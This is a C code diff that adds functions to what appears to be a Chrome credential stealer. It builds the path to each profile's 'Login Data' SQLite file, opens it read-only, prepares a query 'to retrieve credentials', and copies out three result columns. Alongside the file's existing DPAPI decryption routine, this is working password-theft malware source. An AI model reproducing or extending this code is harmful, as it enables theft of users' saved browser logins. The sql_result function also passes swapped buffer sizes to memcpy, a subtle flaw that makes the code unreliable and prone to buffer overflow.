@@ -31,7 +31,7 @@ BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* d
 }
 
 // Gets the browser directory specified by the FOLDER_ID (look at win32 docs) and the relative path from that FOLDER_ID
-BOOL get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
+DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize) {
 	PWSTR p_temp_userdata_location = NULL;															// Temporary pointer to hold returned user data (%LOCALAPPDATA%, %APPDATA%, etc.) folder path
 	HRESULT hr;																						// Error handling 
 	errno_t err;																					// Error handling 
@@ -98,4 +98,53 @@ BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir
 	memset(chrome_dir + lstrlenA(chrome_dir) - 2, '\0', 2);
 
 	return TRUE;
+}
+
+// Open database connection
+BOOL open_database(PSTR chrome_dir_char, PSTR profile_name, void** handle_db, PSTR buf_outMsg, WORD buf_outSize) {
+	errno_t err;
+	int status;
+
+	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\")) != 0) {											// Apend '\\' to the end of chrome_dir_char to make the path for Login Data file for a specific user profile
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '\\\\' to chrome_dir_char error: %d\n", err);)
+		return FALSE;
+	}
+	if ((err = strcat_s(chrome_dir_char, MAX_PATH, profile_name)) != 0) {									// Append "Default" or "Profile \d?" to the end of chrome_dir_char
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending '%s' to chrome_dir_char error: %d\n", profile_name, err);)
+		return FALSE;
+	}
+	if ((err = strcat_s(chrome_dir_char, MAX_PATH, "\\Login Data")) != 0) {									// Append '\Login Data' to end of chrome_dir_char
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "strcat_s: Appending 'Login Data' to chrome_dir_char error: %d\n", err);)
+		return FALSE;
+	}
+
+	if ((status = sqlite3_open_v2(chrome_dir_char, (sqlite3**)handle_db, SQLITE_OPEN_READONLY, NULL)) != SQLITE_OK) {	// Opens the connection to database
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_open_v2: Error when opening database connection to '%s', error: %s:%d\n", profile_name, sqlite3_errmsg(*(sqlite3**)handle_db), status);)
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+// Prepare and get the sql handle for sql statement in order to retrieve credentials
+BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char * sql_stmt, PSTR buf_outMsg, WORD buf_outSize) {
+	int status;
+	if ((status = sqlite3_prepare_v2((sqlite3*)handle_db, sql_stmt, -1, (sqlite3_stmt**)handle_sql_stmt, 0)) != SQLITE_OK) {
+		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "sqlite3_prepare_v2: Error when preaparing statement, error: %s:%d\n", sqlite3_errmsg((sqlite3*)handle_db), status);)
+		return FALSE;
+	}
+	return TRUE;
+}
+
+BOOL sql_result(sqlite3_stmt* handle_sql_stmt, char * result_1, int result_1_size, char * result_2, int result_2_size, char * result_3, int result_3_size) {
+	int status;
+	if ((status = sqlite3_step(handle_sql_stmt)) == SQLITE_ROW) {
+		memcpy(result_1, sqlite3_column_text(handle_sql_stmt, 0), result_1_size);
+		memcpy(result_2, sqlite3_column_text(handle_sql_stmt, 1), result_3_size);
+		memcpy(result_3, sqlite3_column_text(handle_sql_stmt, 2), result_2_size);
+		return TRUE;
+	}
+	else {
+		return FALSE;
+	}
 }
